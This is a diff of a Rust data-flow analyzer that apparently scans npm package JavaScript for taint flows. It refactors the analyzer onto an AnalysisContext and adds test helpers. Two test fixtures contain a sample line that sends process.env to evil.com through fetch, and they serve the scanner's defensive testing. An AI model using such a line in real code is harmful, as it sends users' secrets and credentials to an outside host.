@@ -1,9 +1,8 @@
 use std::collections::HashMap;
-use std::path::PathBuf;
 
 use tree_sitter::{Node, Parser};
 
-use crate::types::{Finding, FindingCategory, Severity};
+use crate::types::{AnalysisContext, Finding, FindingCategory, Severity};
 
 use super::{truncate, Analyzer};
 
@@ -50,11 +49,11 @@ struct TaintState {
 // ---------------------------------------------------------------------------
 
 impl Analyzer for DataFlowAnalyzer {
-    fn analyze(
-        &self,
-        files: &[(PathBuf, String)],
-        _package_json: &serde_json::Value,
-    ) -> Vec<Finding> {
+    fn name(&self) -> &str {
+        "dataflow"
+    }
+
+    fn analyze(&self, ctx: &AnalysisContext) -> Vec<Finding> {
         let mut parser = Parser::new();
         parser
             .set_language(&tree_sitter_javascript::LANGUAGE.into())
@@ -62,7 +61,7 @@ impl Analyzer for DataFlowAnalyzer {
 
         let mut findings = Vec::new();
 
-        for (path, content) in files {
+        for (path, content) in ctx.files {
             let ext = path.extension().and_then(|e| e.to_str()).unwrap_or("");
             if !matches!(ext, "js" | "cjs" | "mjs") {
                 continue;
@@ -649,12 +648,53 @@ fn snippet_for(node: Node, source: &str) -> String {
 #[cfg(test)]
 mod tests {
     use super::*;
+    use std::path::{Path, PathBuf};
+    use crate::registry::package::PackageMetadata;
+
+    fn default_metadata() -> PackageMetadata {
+        PackageMetadata {
+            name: Some("test-pkg".into()),
+            description: None,
+            versions: std::collections::HashMap::new(),
+            time: std::collections::HashMap::new(),
+            maintainers: None,
+            dist_tags: None,
+            extra: std::collections::HashMap::new(),
+        }
+    }
 
     fn analyze_js(code: &str) -> Vec<Finding> {
         let analyzer = DataFlowAnalyzer;
         let files = vec![(PathBuf::from("index.js"), code.to_string())];
         let pkg = serde_json::json!({});
-        analyzer.analyze(&files, &pkg)
+        let metadata = default_metadata();
+        let tmp = Path::new("/tmp");
+        let ctx = AnalysisContext {
+            name: "test-pkg",
+            version: "1.0.0",
+            files: &files,
+            package_json: &pkg,
+            metadata: &metadata,
+            package_dir: tmp,
+        };
+        analyzer.analyze(&ctx)
+    }
+
+    fn analyze_file(file_name: &str, code: &str) -> Vec<Finding> {
+        let analyzer = DataFlowAnalyzer;
+        let files = vec![(PathBuf::from(file_name), code.to_string())];
+        let pkg = serde_json::json!({});
+        let metadata = default_metadata();
+        let tmp = Path::new("/tmp");
+        let ctx = AnalysisContext {
+            name: "test-pkg",
+            version: "1.0.0",
+            files: &files,
+            package_json: &pkg,
+            metadata: &metadata,
+            package_dir: tmp,
+        };
+        analyzer.analyze(&ctx)
     }
 
     #[test]
@@ -788,25 +828,13 @@ console.log(data);
 
     #[test]
     fn skips_non_js_files() {
-        let analyzer = DataFlowAnalyzer;
-        let files = vec![(
-            PathBuf::from("script.ts"),
-            "const d = process.env; fetch('http://evil.com/' + d);".to_string(),
-        )];
-        let pkg = serde_json::json!({});
-        let findings = analyzer.analyze(&files, &pkg);
+        let findings = analyze_file("script.ts", "const d = process.env; fetch('http://evil.com/' + d);");
         assert!(findings.is_empty(), "should skip .ts files");
     }
 
     #[test]
     fn skips_dist_directory() {
-        let analyzer = DataFlowAnalyzer;
-        let files = vec![(
-            PathBuf::from("dist/index.js"),
-            "const d = process.env; fetch('http://evil.com/' + d);".to_string(),
-        )];
-        let pkg = serde_json::json!({});
-        let findings = analyzer.analyze(&files, &pkg);
+        let findings = analyze_file("dist/index.js", "const d = process.env; fetch('http://evil.com/' + d);");
         assert!(findings.is_empty(), "should skip dist/ files");
     }
 
